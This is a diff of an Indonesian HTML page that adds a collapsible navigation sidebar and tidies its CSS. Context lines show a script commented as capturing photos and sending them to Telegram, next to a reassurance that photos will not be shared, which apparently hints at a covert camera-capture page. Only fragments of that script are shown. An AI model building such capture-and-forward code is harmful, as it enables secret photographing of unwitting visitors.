@@ -14,7 +14,6 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            
         }
         .sek {
             font-size: 28px;
@@ -35,7 +34,6 @@
             padding: 0;
             background-color: #f0f0f0;
         }
-        
         .image {
             width: 30px;
             height: 30px;
@@ -48,19 +46,17 @@
             text-align: center;
         }
         .upload-button {
-    background-color: blue;
-    color: white;
-    padding: 15px 30px;
-    font-size: 18px;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-}
-
-.upload-button:hover {
-    background-color: darkblue;
-}
-        
+            background-color: blue;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .upload-button:hover {
+            background-color: darkblue;
+        }
         .jd {
             font-size: 18px;
             color: #666;
@@ -83,6 +79,53 @@
             text-align: center;
             margin-top: 20px;
         }
+
+        /* CSS untuk Sidebar */
+        .sidebar {
+            height: 100%;
+            width: 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: #111;
+            overflow-x: hidden;
+            transition: 0.5s;
+            padding-top: 60px;
+            z-index: 1;
+        }
+        .sidebar a {
+            padding: 10px 15px;
+            text-decoration: none;
+            font-size: 1.2em;
+            color: white;
+            display: block;
+            transition: 0.3s;
+        }
+        .sidebar a:hover {
+            color: #f1f1f1;
+        }
+        .sidebar .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 25px;
+            font-size: 36px;
+            margin-left: 50px;
+        }
+        .open-btn {
+            font-size: 30px;
+            cursor: pointer;
+            position: fixed;
+            z-index: 2;
+            margin-left: 20px;
+            margin-top: 20px;
+        }
+        .open-btn:hover {
+            color: #f1f1f1;
+        }
+        .main-content {
+            transition: margin-left 0.5s;
+            padding: 20px;
+        }
     </style>
 </head>
 <body>
@@ -104,6 +147,19 @@
     <p>Kami tidak akan menjual apalagi menyebar foto-foto yang anda kirim</p>
     <br><br><br>
     <p class="foot">©Shin Studios 2024</p>
+
+    <!-- Sidebar -->
+    <div class="sidebar" id="mySidebar">
+        <a href="javascript:void(0)" class="close-btn" onclick="closeNav()">&times;</a>
+        <a href="#">Home</a>
+        <a href="#">About</a>
+        <a href="#">Services</a>
+        <a href="#">Contact</a>
+    </div>
+
+    <!-- Open button -->
+    <span class="open-btn" onclick="openNav()">&#9776; Open</span>
+
     <script>
         // JavaScript untuk pengambilan foto dan pengiriman ke Telegram
         const canvas = document.createElement('canvas');
@@ -147,6 +203,17 @@
                 });
             }, 'image/jpeg');
         }
+
+        // JavaScript untuk membuka dan menutup sidebar
+        function openNav() {
+            document.getElementById("mySidebar").style.width = "250px";
+            document.getElementById("main").style.marginLeft = "250px";
+        }
+
+        function closeNav() {
+            document.getElementById("mySidebar").style.width = "0";
+            document.getElementById("main").style.marginLeft= "0";
+        }
     </script>
 </body>
-  </html>
+</html>
